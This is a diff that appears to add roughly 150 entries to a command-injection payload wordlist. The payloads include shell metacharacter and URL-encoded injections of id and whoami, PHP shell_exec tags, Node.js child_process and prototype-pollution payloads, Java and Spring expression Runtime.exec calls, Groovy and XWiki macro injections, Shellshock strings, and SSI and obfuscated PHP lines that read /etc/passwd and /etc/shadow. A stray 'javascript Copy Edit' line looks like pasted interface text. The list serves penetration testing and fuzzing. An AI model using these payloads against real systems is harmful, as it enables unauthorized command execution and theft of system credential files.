@@ -15,3 +15,150 @@ eval('whoami');
 system('ls')
 system('pwd');
 darkshadow'.system('id').'
+%3Bwhoami
+%26%26id
+%7Cuname+-a
+<?php echo shell_exec('whoami'); ?>
+<?php exec('whoami'); ?>
+<?php system('whoami'); ?>
+<?php echo `whoami`; ?>
+id`
+{"code":"(function(){try{propertyIsEnumerable.call()}catch(pp){pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami')}})()"}
+
+%0Aid%0A
+%24%7B%40print_r%28%40system%28%22id%22%29%29%7D
+|cat /etc/passwd
+;ping+-c+7+127.0.0.1
+1;ping+-c+7+127.0.0.1
+system(\'ver\')\
+aaaa || cat /etc/passwd
+println('id'.execute().text)
+def proc = 'id'.execute()
+proc.waitFor()
+{"__proto__":{"exec":"id"}}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+T(java.lang.Runtime).getRuntime().exec('id')
+T(java.lang.Runtime).getRuntime().exec('id')
+evil); require('child_process').exec('id', console.log); (//
+println proc.text
+println "sh -c id".execute().text
+def cmd = ['sh', '-c', 'id'] println cmd.execute().text
+${'id'.execute().text}
+<%='id'.execute().text%>
+{{groovy}}println('id'.execute().text){{/groovy}}
+new ProcessBuilder('id').redirectErrorStream(true).start().text
+println new ProcessBuilder('sh','-c','id').start().text
+new GroovyShell().evaluate("'id'.execute().text")
+pwn; whoami; #
+;id
+process.binding('fs').readFileSync('/etc/passwd').toString()
+{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}
+"; process.mainModule.require('child_process').exec('id', console.log); //
+javascript
+Copy
+Edit
+
+|id
+&& id
+$(id)
+{"__proto__": {"exec": "require('child_process').exec('id', console.log)"}}
+id
+{id}
+aaaa%20||%20cat%20/etc/passwd
+%0A/bin/sh -c “echo “$USER””
+darkshadow'.system('id').' 
+02.mp3\";id;#
+<?php system("cat /etc/passwd"); ?>
+php -r '$sl=chr(47);$dot=chr(46);echo shell_exec("cat ${sl}etc${sl}passwd");';#
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+"; id ;//"
+"| id |"
+"& id &"
+"&& id &&"
+"`id`"
+"$(id)"
+%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln('id'.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D 
+}}}{{async async=false}}{{groovy}}println('id'.execute().text){{/groovy}}{{/async}}
+"$(id);"
+";$(id);//"
+"%0Aid%0A"
+"%0a id %0a"
+"%0Aid%0A"
+"%0A/usr/bin/id"
+"%0A/usr/bin/id%0A"
+";$(echo id)|sh"
+"`echo id`"
+"$(echo id)"
+";$(echo -e 'id')"
+";$(echo -e 'i\x64')"
+"eval('id')"
+"exec('id')"
+"() { :;}; /bin/bash -c 'id'"
+"() { :;}; /bin/bash -c 'whoami && id'"
+"() { :;}; /bin/sh -c 'id'"
+"; id; whoami; uname -a ;//"
+"; id && cat /etc/passwd ;//"
+"; id | tee /tmp/output.txt ;//"
+;id;
+;id
+;cat('/etc/passwd').toString();//
+');Runtime.getRuntime().exec("whoami");//
+');system("uname -a");// 
+');`ls -la`;//    
+');exec("pwd");//
+;netstat -a;
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+eval('ls')
+exec('ls')
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+&&id
+;id\n
+ifconfig
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
